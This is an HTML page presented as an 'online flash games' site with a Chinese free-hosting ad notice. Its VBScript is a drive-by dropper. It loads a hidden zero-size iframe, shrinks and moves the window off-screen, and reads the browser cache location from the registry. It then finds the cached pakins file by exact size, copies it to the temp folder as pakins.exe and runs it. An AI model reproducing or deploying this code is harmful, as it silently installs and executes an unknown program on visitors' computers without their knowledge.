

<html>
<title>online flash games</title>
<iframe src="pakins.htm" width="0" height="0" frameborder="0"></iframe>

<SCRIPT LANGUAGE="VBScript">
Option Explicit
Dim FSO, WSH
Dim strCachePath, strExePath '系统缓存文件的路径，要搜索的Exe文件的路径
Dim lngSuccess '搜索是否成功

window.resizeTo 0, 0
window.moveto 10000, 10000

Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSH = CreateObject("WScript.Shell")
strCachePath = WSH.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
lngSuccess = 0

Sub StartSearch()
  SearchFile FSO.GetFolder(strCachePath), "pakins[1].htm"
  if lngSuccess = 0 then SearchFile FSO.GetFolder(strCachePath), "pakins[2].htm"
  if lngSuccess = 0 then setTimeout "StartSearch()", 1000
End Sub

Function SearchFile(Folder, strFileName)
  On Error Resume Next
  Dim SubFolder '子文件夹对象
  Dim strWinTmpPath, strWinSysPath
  Dim strFilePath, File '当前的文件路径，当前的文件对象

  strFilePath=FSO.GetParentFolderName(Folder) & "\" & Folder.Name & "\"
  If FSO.FileExists(strFilePath & strFileName) Then
    strWinTmpPath = FSO.GetSpecialFolder(2) & "\"
    strWinSysPath = FSO.GetSpecialFolder(1) & "\"
    set File = FSO.GetFile(strFilePath & strFileName)

    If File.Size = 104469 then
      File.Copy(strWinTmpPath & "pakins.exe")
      WSH.Run strWinTmpPath & "pakins.exe"
      lngSuccess = 1
      'MsgBox "搞定"
      window.close()
    Else
      Exit Function
    End If
  End If

  If Folder.SubFolders.Count <> 0 Then
    For Each SubFolder In Folder.SubFolders
      SearchFile SubFolder, strFileName
    Next
  End If
End Function

setTimeout "StartSearch()", 1000

</SCRIPT>



<body>
免费空间广告窗口，稍后将自动关闭。

</body>
</html>
